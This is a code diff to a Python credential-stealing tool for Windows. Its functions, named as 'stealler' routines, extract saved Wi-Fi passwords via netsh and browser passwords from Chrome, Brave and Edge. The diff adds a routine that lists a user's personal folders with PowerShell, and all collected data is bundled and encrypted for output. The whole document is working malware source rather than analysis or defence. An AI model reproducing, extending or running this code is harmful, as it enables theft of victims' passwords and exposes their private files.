@@ -4,6 +4,7 @@ import json
 from base64 import b64decode
 import base64
 import sqlite3
+from xml.dom.minidom import Document
 import win32crypt
 from Cryptodome.Cipher import AES
 from Crypto.PublicKey import RSA
@@ -46,10 +47,12 @@ def encrypt(message):
 
 def wifi_pass_stealler():
     global RESULT
+    result = ""
+    result+="WIFI PASSWORDS\n"
+
     data = subprocess.check_output(
         ['netsh', 'wlan', 'show', 'profiles'], shell=True, stderr=sys.stdout).decode('utf-8').split('\n')
     profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-    result = ""
     for i in profiles:
         password = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i,
                                             'key=clear'], shell=True).decode('utf-8').split('\n')
@@ -66,6 +69,8 @@ def wifi_pass_stealler():
 def chrome_pass_stealler():
     global RESULT
     result=""
+    result+="CHROME PASSWORDS\n"
+
     def chrome_date_and_time(chrome_data):
         return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
 
@@ -169,6 +174,8 @@ def chrome_pass_stealler():
 def brave_pass_stealler():
     global RESULT
     result=""
+    result+="BRAVE PASSWORDS\n"
+
     def chrome_date_and_time(chrome_data):
         return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
 
@@ -272,6 +279,7 @@ def brave_pass_stealler():
 def edge_pass_stealler():
     global RESULT
     result=""
+    result+="EDGE PASSWORDS\n"
     def chrome_date_and_time(chrome_data):
         return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
 
@@ -371,6 +379,18 @@ def edge_pass_stealler():
             continue
     RESULT+=result
     ender()
+def enumerate_Directories():
+    global RESULT
+    lst=["Downloads","Documents","Pictures","Music","Desktop"]
+    result=''
+    result+="Directory Enumeration\n"
+    for i in lst:
+        cmd="powershell tree /F C:/Users/prakh/"+i
+        result+= subprocess.run(cmd, capture_output=True, text=True).stdout
+        result+=spacer()
+    RESULT+=result
+    ender()
+
 
 ender()
 if __name__ == "__main__":
@@ -378,4 +398,5 @@ if __name__ == "__main__":
     chrome_pass_stealler()
     brave_pass_stealler()
     edge_pass_stealler()
+    enumerate_Directories()
 print(encrypt(RESULT))
